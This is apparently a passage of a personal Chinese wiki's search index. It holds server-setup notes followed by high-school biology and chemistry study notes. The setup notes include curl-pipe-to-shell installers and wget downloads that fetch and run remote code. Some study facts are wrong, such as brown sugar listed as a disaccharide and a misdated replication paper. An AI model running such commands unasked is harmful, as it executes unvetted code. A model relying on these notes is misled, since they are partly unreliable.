$&#123;HAOZI_DL_URL&#125;/install_panel.sh &amp;&amp; curl -sSL -O $&#123;HAOZI_DL_URL&#125;/install_panel.sh.checksum.txt &amp;&amp; sha256sum -c install_panel.sh.checksum.txt &amp;&amp; bash install_panel.sh || echo &quot;Checksum 验证失败，文件可能被篡改，已终止操作&quot;安装插件 系统工具箱安装插件 Podman安装插件 Supervisor安装插件 Redis安装插件 MySQL-5.7安装插件 PHP-8.1安装插件 OpenResty安装插件 phpMyAdmin（需等待前者完毕）安装插件 Pure-FTPd安装插件 Frp#安装DDNS—GOwget https://cfproxy.hzchu.top/https://github.com/jeessy2/ddns-go/releases/download/v6.7.0/ddns-go_6.7.0_linux_x86_64.tar.gztar xzvf ddns-go_6.7.0_linux_x86_64.tar.gz ./ddns-go -s install#面板内放行9876端口#安装onep#放行60181端口sudo apt-get install libmagickwand-devmkdir /opt/onepcd /opt/onepwget http://192.168.1.52:51515/mainwget http://192.168.1.52:51515/config.yaml#安装探针#配置转发Cloudreve#安装Cloudflare tunnel#安装tailscalecurl -fsSL https://tailscale.com/install.sh | shtailscale up --exit-node=#安装dockercurl -fsSL https://get.docker.com | bash -s docker#安装CloudflareSpeedtestdocker run -d --restart=always --name CloudflareSpeedtest-Slave \\-e MAX_MBPS=600 \\dp.rtc.ovh/genshinminecraft/cloudflarespeedtest-slave:v0.0.6#安全性调优 https://dusays.com/737/#安装pipwget https://bootstrap.pypa.io/get-pip.pysudo python3 get-pip.py --break-system-packages nano ~/.bashrc &gt; alias pi=&#x27;pip install --break-system-packages&#x27; 缺少依赖 1-bash: ./artalk: cannot execute: required file not found 1234ldd ./artalk# libc.musl-x86_64.so.1 =&gt; not foundsudo apt install musl"},{"title":"笔记索引","path":"/wiki/study-notes/english/index.html","content":"参阅：英语索引.xlsx - Onedrive 备用：英语索引.xlsx - ZTale (hzchu.top)"},{"title":"相关资料","path":"/wiki/study-notes/references/index.html","content":"这里记载了本笔记所有使用或引用到的在线内容，感谢原作者们的付出😘 数学 虚数的意义 - 阮一峰的网络日志 (ruanyifeng.com) 虚数介绍 (文章) | 什么是虚数？ | 可汗学院 (khanacademy.org) 总体百分位数的估计_高中数学知识点总结_师梦圆 (shimengyuan.com) 英语 湛江二模英语作文(2024) 普通高中教科书·英语选择性必修 第四册 (smartedu.cn) 英语作文“首先，然后，其次，最后”的高级用法是什么？_百度知道 (baidu.com) 英语作文_邀请信英语作文模板万能句子_沪江英语 (hjenglish.com) 物理 【高中物理】物理学史最全总结！ 物理学历史都来了 - 哔哩哔哩 (bilibili.com) 高中物理必修二·开普勒三定律 - 知乎 (zhihu.com) 化学 常见实验室制备方程 - 百度文库 (baidu.com) 普通高中教科书·化学选择性必修3 有机化学基础 (smartedu.cn) 常用的化学仪器及名称图(整理) - 百度文库 (baidu.com) 259 如何用电子式表示离子化合物的形成过程_哔哩哔哩_bilibili 生物 高考生物学史整理 - 百度文库 (baidu.com) 生物学史(高中教材) - 百度文库 (baidu.com) 生态工程四个主要基本原理的辨析-怀化市湖天中学 (hhshtzx.com) 编写过程 使用Markdown语法编写数学公式（详细版）_markdown写公式-CSDN博客 markdown化学方程式_markdown输入化学方程式-CSDN博客 好文 物理 全网最齐：一文搞定物理实验仪器读数 - 哔哩哔哩 (bilibili.com) 化学 高中有机化学 加成反应、取代反应的反应条件是什么？_百度知道 (baidu.com) 高中化学实验——启普发生器 - 知乎 (zhihu.com) 生物 等位基因 - 医学百科 (yixue.com) 染色单体 - 医学百科 (yixue.com) 什么是三系杂交水稻？----中国科学院 (cas.cn) 有用的 ZHI-BLOG (zhwei101.com)"},{"title":"概念","path":"/wiki/study-notes/biology/conceptions/index.html","content":"植物激素 生长素（IAA） 化学本质：吲哚乙酸 来源：色氨酸 合成部位：芽、幼嫩的叶和发育中的种子 分布：在各器官中都有分布，但集中分布在生长旺盛的部分，如胚芽鞘、芽和根尖的分生组织、形成层、发育中的种子和果实等处。 主要作用：1.在细胞水平上促进细胞生长，诱导细胞分化等作用。2.在器官水平上影响器官的生长、发育，如促进侧根和不定根发生，影响花、叶、果实发育等 敏感度：根 &gt; 芽 &gt; 茎（根在浓度更高时促进，茎在浓度更低时促进） 细胞分裂素 合成部位：主要是根尖。 主要作用：促进细胞分裂；促进芽的分化、侧枝发育、叶绿素合成。 扩展：生长素促进核分裂，细胞分裂素促进质分裂 正所谓生根分芽，当生长素与分裂素的比&gt;1时促进根的发生，&lt;1时促进芽的产生，=1时促进愈伤组织的产生 赤霉素 合成部位：幼芽、幼根和未成熟的种子 主要作用：1.促进细胞伸长，从而引起植株增高。2.促进细胞分裂与分化。3.促进种子萌发、开花和果实发育。 扩展：其可促进生长素合成，抑制生长素分解，故作用与合成部位与生长素类似。 乙烯 合成部位：植物体各个部位。 主要作用：促进果实成熟；促进开花；促进叶、花、果实脱落。 脱落酸 合成部位：根冠、萎蔫的叶片等。 主要作用：1.抑制细胞分裂.2.促进气孔关闭。3.促进叶和果实的衰老和脱落。4.维持种子休眠。（可作为保鲜剂） 油菜素内酯 主要作用：促进茎、叶细胞的扩展和分裂，促进花粉管生长、种子萌发等。 发酵工程 微生物 毛霉 类型：异养需氧型，真菌 适宜温度：18℃~20℃ 用途：制作腐乳 乳酸菌 包括乳酸杆菌和乳酸链球菌，厌氧细菌（原核生物，无线粒体等结构） 类型：异养厌氧型 繁殖方式：二分裂 适宜温度：30℃~40℃ 用途：制作酸奶 酵母菌 类型：异养兼性厌氧型，单细胞真菌（真核生物），几丁质/壳多糖壁 繁殖方式：使用出芽生殖（属于有丝分裂）或孢子生殖 适宜温度：18℃~30℃（有多种菌） 发酵时间：10~12天 用途：酿酒 醋酸菌 类型：异养需氧型，好氧细菌，肽聚糖壁 繁殖方式：二分裂 适宜温度：30~35℃ 发酵时间：6~7天 用途：制作果醋 方程式 醋酸菌在糖原充足的环境下：C6H12O6+O2→酶2CH3COOH(醋酸)+2CO2+2H2O+能量\\text{C}_6\\text{H}_{12}\\text{O}_6 + \\text{O}_2 \\xrightarrow{\\text{酶}} 2\\text{CH}_3\\text{COOH}(醋酸) + 2\\text{CO}_2 + 2\\text{H}_2\\text{O} + \\text{能量}C6​H12​O6​+O2​酶​2CH3​COOH(醋酸)+2CO2​+2H2​O+能量 糖原不足的情况下使用酒精：C2H5OH+O2→酶CH3COOH(醋酸)+H2O+能量\\text{C}_2\\text{H}_5\\text{OH} + \\text{O}_2 \\xrightarrow{\\text{酶}} \\text{CH}_3\\text{COOH}(醋酸) + \\text{H}_2\\text{O} + \\text{能量}C2​H5​OH+O2​酶​CH3​COOH(醋酸)+H2​O+能量 酵母菌产生酒精：C6H12O6→酶2C2H5OH(酒精)+2CO2+能量\\text{C}_6\\text{H}_{12}\\text{O}_6 \\xrightarrow{\\text{酶}} 2\\text{C}_2\\text{H}_5\\text{OH}(酒精) + 2\\text{CO}_2 + \\text{能量}C6​H12​O6​酶​2C2​H5​OH(酒精)+2CO2​+能量 乳酸菌产生乳酸：C6H12O6→酶2C3H6O3(乳酸)+能量\\text{C}_6\\text{H}_{12}\\text{O}_6 \\xrightarrow{\\text{酶}} 2\\text{C}_3\\text{H}_6\\text{O}_3(乳酸) + \\text{能量}C6​H12​O6​酶​2C3​H6​O3​(乳酸)+能量"},{"title":"生物学史","path":"/wiki/study-notes/biology/history/index.html","content":"注意未修订 必修一 （一）细胞学说的建立和发展过程 1.1543年，比利时的维萨里发表《人体构造》，揭示了人体在器官水平的结构。 2.罗伯特虎克：英国人，细胞的发现者和命名者。1665年，他用显微镜观察植物的木栓组织，发现由许多规则的小室组成，并把“小室”称为cell——细胞。 3.列文虎克：荷兰人，他用自制的显微镜进行观察，对红细胞和动物精子进行了精确的描述。 4.19世纪30年代，德国植物学家施莱登(1804—1881)和动物学家施旺(1810—1882)提出了细胞学说，指出细胞是一切动植物结构的基本单位。恩格斯曾把细胞学说誉为19世纪自然科学三大发现之一。 5.魏尔肖：德国人，他在前人研究成果的基础上，总结出“细胞通过分裂产生新细胞”。 （二）生物膜流动镶嵌模型的探索历程 1.1895年，欧文顿发现脂质更容易通过细胞膜。提出假说：膜是由脂质组成的。 2.20世纪初，科学家的化学分析结果，指出膜主要由脂质和蛋白质组成。 3.1925年，两位荷兰科学家用丙酮从细胞膜中提取脂质，铺成单层分子，发现面积是细胞膜的2倍。提出假说：细胞膜中的磷脂是双层的 4.1959年，罗伯特森在电镜下看到细胞膜由“暗—亮—暗”的三层结构构成。提出假说：生物膜是由“蛋白质—脂质—蛋白质”的三层结构构成的静态统一结构 5.1970年，科学家用荧光标记人和鼠的细胞膜并让两种细胞融合，放置一段时间后发现两种荧光抗体均匀分布。提出假说：细胞膜具有流动性 6.1972年，桑格和尼克森提出生物膜流动镶嵌模型，强调膜的流动性和膜蛋白分布的不对称性，并为大多数人所接受。 （三）酶的发现史 1.斯帕兰札尼：意大利人，生理学家。1783年他通过实验证实胃液具有化学性消化作用。 2.巴斯德：法国人，微生物学家，化学家，提出酿酒中的发酵是由于酵母菌的存在，没有活细胞的参与，糖类是不可能变成酒精。 3.李比希：德国人，化学家。认为引起发酵时酵母细胞中的某些物质，但这些物质只有在酵母细胞死亡并裂解后才能发挥作用。 4.毕希纳：德国人，化学家。他从酵母细胞中获得了含有酶的提取液，并用这种提取液成功地进行了酒精发酵。 5.萨姆纳：美国人，化学家。1926年，他从刀豆种子中提取到脲酶的结晶，并用多种方法证明脲酶是蛋白质。荣获1946年诺贝尔化学奖。 6.20世纪80年代， 美国科学家切赫和奥特曼发现少数RNA也有生物催化作用。 （四）光合作用的发现史 1.1648一1653年，比利时医生海尔蒙特做了盆栽柳树称重实验，得出植物的重量主要不是来自土壤而是来自水的推论。他没有认识到空气中的物质参与了有机物的形成。 2.1771年，英国的普里斯特利发现植物可以恢复因蜡烛燃烧而变污浊的空气。 3.1773年，荷兰的英格豪斯证明只有植物的绿色部分在光下才能更新污浊的空气。 4.1845年，德国的梅耶发现植物把光能转化成了化学能储存起来。 5.1864年，德国科学家萨克斯证明光合作用产生了淀粉。 6.1880年，美国生物学家恩格尔曼利用好氧细菌证明氧气是光合作用的产物。 7.1939年，美国的鲁宾和卡门利用同位素18O进行示踪实验证明光合作用释放的氧气来自水。 8.1957年，美国生物学家卡尔文利用放射性同位素标记法，用14C标记CO2发现了卡尔文循环。 必修二 （五）遗传定律的发现史 1.孟德尔：奥地利人，遗传学的奠基人。他进行了长达8年的豌豆杂交实验，通过分析实验结果，发现了生物遗传的规律。1866年他发表论文《植物杂交试验》，提出了遗传学的分离定律、自由组合定律和遗传因子学说。 2.约翰逊：丹麦人，植物学家。1909年，他给孟德尔的“遗传因子”重新起名为“基因”，并提出了表现型和基因型的概念。 3.魏斯曼：德国人，动物学家。他预言在精子和卵细胞成熟的过程中存在减数分裂过程，后来被其他科学家的显微镜观察所证实。 4.萨顿：美国人，细胞学家。1903年，他在研究中发现孟德尔假设的遗传因子的分离与减数分裂过程中同源染色体的分离非常相似，并由此提出了遗传因子（基因）位于染色体上的假说。 5.摩尔根：美国人，遗传学家，胚胎学家。他用果蝇做了大量实验，发现了基因的连锁互换定律，人们称之为遗传学的第三定律。他还证明基因在染色体上呈线性排列，为现代遗传学奠定了细胞学基础。 6.18世纪英国著名的化学家和物理学家道尔顿，第1个发现了色盲症，也是第1个被发现的色盲症患者。 （六）遗传物质的发现史 1.1928年，格里菲思用肺炎双球菌在小鼠身上进行体内转化实验，提出细菌中有转化因子。 2.1944年，美国科学家艾弗里和同事进行肺炎双球菌体外转化实验，确定转化因子是DNA。 肺炎双球菌的转化实验证明DNA是遗传物质、蛋白质不是遗传物质。 3.1952年，赫尔希和蔡斯进行噬菌体侵染细菌的实验，证明DNA是遗传物质。 4.后来，烟草花叶病毒侵染烟草实验证明RNA也是遗传物质。 5.通过比较：所以说，DNA是主要遗传物质。 （七）DNA分子双螺旋结构的发现史 1.DNA右手双螺旋结构是由美国科学家沃森和克里克在1953年发现的。 2.1951年，英国的威尔金斯展示了一张DNA的X射线衍射图谱。 3.1952年，奥地利生物化学家查哥夫测定了DNA中4种碱基的含量，发现：腺膘呤与胸腺嘧啶的数量相等，鸟膘呤与胞嘧啶的数量相等。 4.1953年，沃森、克里克调整了碱基配对方式，制作出了DNA双螺旋结构分子模型。 5.1962年，沃森、克里克和威尔金斯三人因这一成果而共同获得了诺贝尔生理学或医学奖。 6.1962年，沃森、克里克发表了一篇论文，阐明了DNA的半保留复制机制。 7.1957年克里克提出中心法则 8.尼伦伯格和马太成功破译了第一个遗传密码。 （八）生物进化史 1.拉马克（1744～1829）：法国人，博物学家，生物进化论的先驱。最先提出了生物进化的学说，认为生物是不断进化的，生物进化的原因是用进废退和获得性遗传。 2.达尔文（1809～1882）：英国人，博物学家，生物进化论的主要奠基人。1859年，他出版了科学巨著《物种起源》，书中充分论证了生物的进化，并明确提出自然选择学说来说明进化机理。他创立的进化论的影响远远超出了生物学的范围，它给予神创论和物种不变论以致命的打击，为辩证唯物主义世界观提供了有力的武器。 3.后人提出现代生物进化理论 必修三 （九）内环境与稳态 1.贝尔纳（1813～1878）：法国人， 1857年，他提出“内环境”的概念，并推测内环境的恒定主要依赖于神经系统的调节。 2.坎农（1871～1945）：美国人，生理学家。1926年，他提出了“稳态”的的概念，并提出了稳态维持机制的经典解释：内环境稳态是在神经调节和体液调节的共同作用下，通过机体各种器官、系统分工合作、协调统一而实现的。 3.目前普遍认为：神经——体液——免疫调节网络是机体维持稳态的主要调节机制 （十）促胰液素的发现 1.在19世纪，学术界普遍认为：胃酸刺激小肠的神经，神经将兴奋传给胰腺，使胰腺分泌胰液。胰腺分泌胰液为神经调节。 2.法国学者沃泰默的论文，声称在小肠和胰腺之间存在着一个顽固的局部反射。实验是这样的：①直接将稀盐酸溶液注入狗的上段小肠时，会引起胰液分泌。②直接把稀盐酸溶液注入狗的血液循环，则不能引起胰液分泌。③他把实验狗通向该段小肠的神经全部切除，只保留血管。当把稀盐酸溶液输入这段小肠后，仍能引起胰液分泌。但他仍然坚信这个反应是一个顽固的神经反射，因为他认为，小肠的神经是难以切除得干净、彻底的。 3.1902年1月。当英国科学家贝利斯和斯他林看到沃泰默的论文，并大胆地跳出&quot;神经反射&quot;这个传统概念的框框，设想：这可能是一个新现象–“化学调节”。也就是说，在盐酸的作用下，小肠粘膜可能产生了一个化学物质，当其被吸收入血液后，随着血流被运送到胰腺，引起胰液分泌。 4.为了证实上述3中的设想，斯他林立即把同一条狗的另一段空肠剪下来，刮下粘膜，加砂子和稀盐酸研碎，再把浸液中和、过滤，做成粗提取液，注射到同一条狗的静脉中去，结果，引起了比前面切除神经的实验更明显的胰液分泌。这样，完全证实了他们的设想。他们把这个物质被命名为促胰液素（secretin）。促胰液素便是历史上第一个被发现的激素。 巴甫洛夫：俄国人，生理学家，现代消化生理学的奠基人。1891年开始研究消化生理，在“海登海因小胃”基础上，他制成了保留神经支配的“巴甫洛夫小胃”，并创造了一系列研究消化生理的慢性实验方法，揭示了消化系统活动的一些基本规律。为此，他荣获1904年诺贝尔生理学或医学奖。20世纪初，他的研究重点转到高级神经活动方面，建立了条件反射学说。 （十一）植物生长素的发现史 1.1880年，达尔文通过实验推想，胚芽鞘的尖端可能会产生某种物质，这种物质在单侧光的照射下，对胚芽鞘下面的部分会产生某种影响。 2.詹森：丹麦人，植物生理学家。1910年，他通过实验证明，胚芽鞘顶尖产生的刺激可以透过琼脂片传递给下部。 3.拜尔：匈牙利人，植物生理学家。1914年，他通过实验证明，胚芽鞘的弯曲生长，是因为顶尖产生的刺激在其下部分布不均匀造成的。 4.温特：美籍荷兰人，植物生理学家。1928年，他用实验证明造成胚芽鞘弯曲的刺激是一种化学物质，他认为这可能是和动物激素类似的物质，并把这种物质命名为生长素。 5.1934年，荷兰科学家郭葛等人从植物中提取出吲哚乙酸——生长素。简称IAA （十二）种群与生态系统研究史 1.高斯：生态学家。他通过实验发现草履虫种群数量增长的S型曲线。 2.林德曼（1915～1942）：美国人，生态学家。他通过对一个结构相对简单的天然湖泊——赛达伯格湖的能量流动进行的定量分析，发现生态系统的能量流动具有单向流动、逐级递减两个特点，能量在相邻两个营养级间的传递效率大约是10%～20%。 选修三 张明觉（1908～1991）：美籍华人，生于山西岚县，生理学家。他一生倾心于生殖生理学科研究，是世界上最早从事试管婴儿和避孕药品研究的科学家之一，被科学界誉为“试管婴儿之父”和“避孕药之父”。 动物细胞工程 1976年，阿根廷科学家米尔斯坦(Cesar Milstein，l926一)和德国科学家柯勒(GeorgesKohler，l946一)，通过细胞融合制备出单克隆抗体。由于他们的杰出工作，在1984年，获得了诺贝尔生理学或医学奖。 斯图尔德（F.C.Steward）用胡萝卜韧皮部的细胞培养成了胡萝卜植株，证明了高度分化的植物细胞具有全能性。 韦尔穆特(I.Wilmut)等在体外条件下将羊体细胞培养成了成熟个体，证明了哺乳动物体细胞核具有全能性。 1951 年，张明觉和奥斯汀发现精子获能 1988 年，穆里斯等人发明 PCR 钱嘉韵分离出耐高温 DNA 聚合酶并于 1976 年在《细菌学杂志》发表论文 1952 年，美国布里格斯将金将豹蛙囊胚细胞的核移植到去核卵中得到能够发育的胚胎 20 世纪 70 年代，我国科学家运用核移植技术将鲤鱼囊胚细胞的核移植到去核鲤鱼未受精卵中，培养出鲤鲫移核鱼 1972 年，美国斯坦福大学伯格第一次重组 DNA 获得成功 1975 年，英国科学家米尔斯坦，德国科学家科勒制备出单克隆抗体"},{"title":"题目","path":"/wiki/study-notes/biology/test/index.html","content":"A B C D: 生殖细胞！ C: 抗生素只能创造无菌环境，不能创造无毒环境 生态工程的四个基本原理包括：自生（物种多样性原理）、协调（协调与平衡原理）、循环（物质循环再生原理）、整体（整体性原理）。 生态工程的四个基本原理实例1、在人工林中增加植被层次——体现自生原理。2、建设“海绵城市”种植水生植被净化，对植物引种的选择——体现自生原理。3、单一人工林比天然混合林稳定性低，易爆发虫害——违背自生原理。4、湿地的破坏，水体的污染——违背自生原理。5、无废弃物农业——体现循环原理。6、建立高新农业时，沼气池的建立——体现循环原理。7、某生态工程以沼气工程为中心，各类植物的秸秆、枝叶用来生产饲料喂养畜、禽、鱼，人、畜、禽粪便作为原料生产沼气，沼渣水返还农田、菜园、果园、苗圃、鱼塘——体现循环原理。8、引种时考虑是否适应环境——体现协调原理。9、草原确定合理载畜量，不能过度放牧——体现协调原理。10、应用植物修复技术治理重金属污染的土壤时，需选择符合要求的植物——体现协调原理。11、一个生态系统中种群的数量不应超过环境容纳量——体现协调原理。12、在对毛乌素沙漠治理过程中，栽培的植物的选择——体现自生和协调原理。13、太湖水体富营养化引起大面积水华——违背自生原理和协调原理。14、在进行林业生态工程建设时，既号召农民种树又要考虑农民生活问题——体现整体原理。15、园林既能改善生态环境，又能提高社会和经济效益——体现整体原理。16、前面造林，后面砍树——违背整体原理。17、桑基鱼塘——体现自生、协调、循环、整体原理。18、桑基鱼塘中的生物组分通过合理布设，互利共存，实现了系统结构和功能的协调，形成了可以自我维持的有序整体——体现自生原理。19、“陆基种桑、桑叶饲蚕、蚕沙喂鱼、塘泥培桑”的农业生产模式——体现循环原理。20、桑基鱼塘中的桑和甘蔗适应我国南方温暖湿润的气候；四大家鱼混养充分利用了群落的空间结构；桑叶饲蚕，利用了种间关系，但养殖的蚕的数量没有多到危及桑的存活——体现协调原理。21、桑基鱼塘将原本割裂的生产系统优化组合，能够发展多种经营，为农民创造收入，是结构优化的“社会—经济—自然复合系统”——体现整体原理。22、桑基鱼塘模式大大提高系统生产力——体现自生原理。基本知识自生原理概念：由生物组分而产生的自组织、自我优化、自我调节、自我更新和维持。理论基础：生态系统的结构与功能（生态系统具有自我调节能力）；个体水平上生物能够进行新陈代谢、再生更新等，系统水平上生物之间通过各种相互作用(特别是种间关系)进行自组织，实现系统结构与功能的协调，形成有序的整体。实施措施：①在生态工程中有效选择生物组分并合理布设（尽量提高生物多样性程度）；②需要创造有益于生物组分的生长、发育、繁殖，以及它们形成互利共存关系的条件。循环原理概念：指在生态工程中促进系统的物质迁移与转化，既保证各个环节物质迁移顺畅，也保证主要物质或元素的转化率高。理论基础：生态系统的物质循环功能。应用原则：通过系统设计实现不断循环，使前一环节产生的废物尽可能地被后一环节利用，减少整个生产环节“废物”的产生。实例：无废弃物农业——保证了土壤的肥力，改善了土壤结构，培育了土壤微生物，实现了土壤养分如氮、磷、钾及微量元素的循环利用。协调原理概念：在进行生态工程建设时，生物与环境、生物与生物的协调与适应也是需要考虑的问题。实施措施：①生物与环境、生物与生物之间要协调与适应②考虑环境容纳量实例：我国西部地区缺雨干旱，土壤较为贫瘠，应该选择适合当地自然环境条件的树种，如沙棘、山杏、刺槐、小叶锦鸡儿等。在西北地区发展畜牧养殖业，应该注意牲畜数量不能超过草地的承载力(环境容纳量)。整体原理概念：系统建设以整体观为指导，进行生态工程建设时，不仅考虑自然生态系统的规律，更要考虑经济和社会等系统的影响力。理论基础：①遵从自然生态系统的规律，各组分之间要有适当的比例，不同组分之间应构成有序的结构，通过改变和优化结构，达到改善系统功能的目的。②进行生态工程建设时，不仅要考虑自然生态系统的规律，更要考虑经济和社会等系统的影响力。③社会习惯、法律制度等也都对生态工程建设有着重要影响。实例：林业建设中自然系统与社会、经济系统的关系问题。关键点生物多样性，自我调节能力——自生物质循环，无废弃物——循环生物与生物，生物与无机环境的协调——协调自然，经济，社会——整体 D"},{"title":"物质校验","path":"/wiki/study-notes/biology/thingsandcolors/index.html","content":"葡萄糖（还原糖） 试剂：斐林试剂 构成：甲液：液质量浓度为0.1g/mL的NaOHNaOHNaOH溶液。乙液：质量浓度为0.05g/mL的CuSO4CuSO_4CuSO4​溶液。使用时甲乙两液等量混合，取1mL使用 条件：50°C~60°C水浴加热约2分钟 结果：颜色由蓝色(Cu(OH)2Cu(OH)_2Cu(OH)2​本身的颜色)变成棕色(蓝色与砖红色混合)，最后变成砖红色沉淀(Cu2OCu_2OCu2​O本身的颜色) 相关实验（还原糖的检测和观察）要点 需选择含糖量高，白色或近于白色的植物组织（避免遮蔽视野颜色），经研磨过滤（单层纱布，避免植物组织样液过多丢失）后使用 斐林试剂需现配现用 由于Cu(OH)2Cu(OH)_2Cu(OH)2​本身就有颜色，当不存在还原糖时溶液呈现蓝色而不是无色 结论：植物组织中含有还原糖 扩展：还原糖包括： 所有的单糖（如核糖，葡萄糖，果糖和半乳糖） 部分二糖（麦芽糖和红糖） 蛋白质 试剂：双缩脲试剂 构成：A液：液质量浓度为0.1g/mL的NaOHNaOHNaOH溶液。B液：质量浓度为0.01g/mL的CuSO4CuSO_4CuSO4​溶液。使用时加入A液1mL及B液4滴 条件：加入两种溶液后摇匀即可 结果：溶液由无色（双缩脲试剂是后加入的，在加入前溶液无色）变为蓝色，最后变为紫色 相关实验（蛋白质的检测和观察）要点： 选材：可使用新鲜的肝脏研磨液，稀释（防止产生的紫色络合物粘在试管上洗不掉）的蛋清，过滤的豆浆 反应对象需至少还有两个肽键 B液滴入太多的时会产生太多蓝色沉淀，遮蔽紫色 结论：组织样液中含有蛋白质 脂肪 试剂：苏丹Ⅲ染液结果：脂肪被染成橘黄色相关实验（右图）扩展：苏丹Ⅳ染液也可以用脂肪的鉴定，脂肪会被染为红色 必修一P19 淀粉 试剂：碘液 操作：制备马铃薯匀浆，加入碘液2滴摇匀后变成蓝色 CO2 试剂：溴麝香草酚蓝溶液或澄清的石灰水 结果：可使溴麝香草酚蓝溶液由蓝变绿再变黄，或使澄清的石灰水变浑浊 判断：根据变成黄色所需时间长短或浑浊程度可检测酵母菌培养液中CO2CO_2CO2​的产生情况 乙醇（酒精） 试剂：酸性重铬酸钾溶液（使用浓硫酸酸化） 结果：由橙色变为灰绿色 注意：葡萄糖也能与重铬酸钾溶液反应，因此应将酵母菌的培养时间适当延长以耗尽溶液中的葡萄糖 其它 染色体：甲紫溶液（龙胆紫溶液）或醋酸洋红 线粒体：健那绿（染成蓝绿色）"},{"title":"概念","path":"/wiki/study-notes/chemistry/conceptions/index.html","content":"物质表达方式 等待修改 CN MEAN 分子式 用元素符号和下标表示分子中每种元素的原子数 结构式 用化学键连接的方式显示分子中每个原子的位置和连接方式 结构简式 简化的结构式，通常省略碳原子和氢原子之间的连接线 实验式/最简式 元素的最简整数比 键线式 用线段表示共价键或离子键 各类方程式 电子式"},{"title":"常用的化学仪器及名称图","path":"/wiki/study-notes/chemistry/equipments/index.html","content":"image-20240701152355385 image-20240701152349751 image-20240701152417039 image-20240701152446077 image-20240701152508562 image-20240701152456493 以及：玻璃搅拌器 容量瓶的规格分别为：50ml，100ml，250ml，500ml，1000ml，容量瓶写法为1000ml容量瓶 化学常用仪器： 根据用途分类 1、 能直接加热的仪器: 试管、蒸发皿、燃烧匙. 2、不能直接加热的仪器: 烧杯、烧瓶. 3、不能加热的仪器: 集气瓶、水槽、漏斗、量筒. 4、用于称量和量取的仪器:托盘天平、量筒. 5、用于取药品的仪器:药匙、镊子、胶头滴管. 6、给液体加热的仪器:试管、烧杯、烧瓶、蒸发皿 7、给固体加热的仪器:试管、蒸发皿 8、用于夹持或支撑的仪器:试管夹、铁架台(带铁夹或铁圈) 、坩埚钳. 9、过滤分离的仪器:漏斗、玻璃棒. 10、加热常用的仪器:酒精灯. 11、加热至高温的仪器:酒精喷灯、电炉. 化学实验基本操作 一、 药品的取用 （一） 三大原则 1、取用药品的“三” 不原则: 不触 不尝不猛闻 2、取用药品的用量:“节约原则”⑴严格按实验规定用量; ⑵未指明用量取最少量:液体1mL-2mL;固体盖满 试管底部。 3、实验剩余药品“三不”原则：不丢 不回 不带走． （二）取用方法 1、固体药品的取用方法：⑴块状固体和密度较大的金属颗粒：“一横二放三慢竖”． ⑵粉末状固体：“一斜二送三直立”．a、块状或密度较大的固体颗粒一般用镊子夹取。 b、粉末状或小颗粒状的药品用钥匙（或纸槽）。 c 、使用过的镊子或钥匙应立即用干净的纸擦干净。 2 、液体药品的取用方法 （1） 较多量：“一放、二向、三挨、四流”． A、从细口瓶里取用试液时，应把瓶塞拿下，倒放在桌上； B、倾倒液体时，应使标签向着手心，瓶口紧靠试管口或仪器口，防止残留在瓶口的药液流下来腐蚀标签。 （2）较少量：用胶头滴管吸取． A、 吸有药液的滴管应悬空垂直在仪器的正上方，将药液滴入接受药液的仪器中，不要让吸有药液的滴管接触仪器壁； B、 不要将滴管平放在实验台或其他地方，以免沾污滴管； C、 不能用未清洗的滴管再吸别的试剂（滴瓶上的滴管不能交叉使用，也不需冲洗） 二、一定量药品的称量和液体的量取 液体（用量筒量取） 固体（用托盘天平称取） （一）托盘天平 固体称量用天平，平放然后再调零；用纸先将盘底垫，易潮易腐放烧杯；左物右码不要乱，右加游码等于左； 取码用镊手不沾，先大后小游码添；完毕砝码归盒中，游码回到零刻度． A、 酒精灯内的酒精不超过容积的2/3； B、用完酒精灯后必须用灯帽盖灭，不可用嘴去吹灭； C、绝对禁止向燃着的酒精灯内添加酒精； D、绝对禁止用燃着的酒精灯引燃另一盏酒精灯，以免引起火灾。 E、不用酒精灯时，要盖上灯帽，以防止酒精挥发。 （二）量筒的使用 1 、操作要领：量筒平放实验桌，先倒后滴把量瞅；平视凹液最低处，三线一齐为读数． 2 、注意：平视：读数＝实际体积数 俯视：读数﹥实际体积数 仰视：读数﹤实际体积数 3、 量取液体体积操作：先向量筒里倾倒液体至接近所需刻度后用滴管滴加到刻度线。 量筒是一种量器，只能用来量取液体，不能长期存放药品，也不能作为反应的容器。不能用来量过冷或过热的液体，不宜加热。 三、 物质的加热 （一）酒精灯 1.构造：灯体、灯帽、灯芯． 2.火焰：外焰、内焰、焰心（外焰温度最高） 3.使用方法：两查两禁一不可． 【 “两查”：检查灯心是否浸入酒精中，检查酒精灯中酒精是否多于容积的三分之一 “二禁”：禁止向燃着的灯里添加酒精，禁止用酒精灯去引燃另一只酒精灯 “一不可”：不可用嘴吹灭酒精灯，应该用灯帽盖灭火焰 】 【 给药品加热时 要把仪器擦干 (放炸裂) ，先进行预热，然后固定在药品的下方加热；加热 固体 药品，药品要铺平，要把 试管口稍向下倾斜， 以防止水倒流入试管而使试管破裂；加热 液体 药品时， 液体体积不能超过试管容积的1/3， 要把试管向上倾斜45°角，并不能将试管口对着自己或别人 ； 加热完毕不能用冷水立即冲洗, 防炸裂 】 （二）加热的仪器 1 、加热的仪器 加热固体：干燥的试管、蒸发皿 加热液体：试管、烧杯、烧瓶、蒸发皿 有些仪器不能加热（集气瓶、量筒、漏斗等） 2 、仪器的固定 试管：试管夹、铁架台的铁夹 烧杯或烧瓶：用铁架台的铁圈和石棉网 蒸发皿：用铁架台的铁圈或三脚架 四、过滤 1、作用:除去液体中混有的固体物质的一种方法; 2、仪器:漏斗 、 烧杯 、 玻璃棒 、 铁架台(带铁圈); 3、操作:一贴二低三靠. 【一贴：指滤纸要紧贴漏斗壁，一般在将滤纸贴在漏斗壁时先用水润湿并挤出气泡，因为如果有气泡会影响过滤速度 。】 【 二低：一是滤纸的边缘要稍低于漏斗的边缘；二是在整个过滤过程中还要始终注意到滤液的液面要低于滤纸的边缘。否则的话，被过滤的液体会从滤纸与漏斗之间的间隙流下，直接流到漏斗下边的接受器中，这样未经过滤的液体与滤液混在一起，而使滤液浑浊，没有达到过滤的目的。 】 【 三靠：一是待过滤的液体倒入漏斗中时，盛有待过滤液体的烧杯的烧杯嘴要靠在倾斜的玻璃棒上（玻璃棒引流）；二是指玻璃棒下端要靠在三层滤纸一边（三层滤纸一边比一层滤纸那边厚，三层滤纸那边不易被弄破）；三是指漏斗的颈部要紧靠接收滤液的接受器的内壁 。】 五、蒸发 1、仪器:酒精灯、烧杯、玻璃棒、蒸发皿、铁架台(带铁圈). 2、操作: (1)放好酒精灯并据其高度调节铁圈的高度; (2)放好蒸发皿,倒入待蒸发的液体; 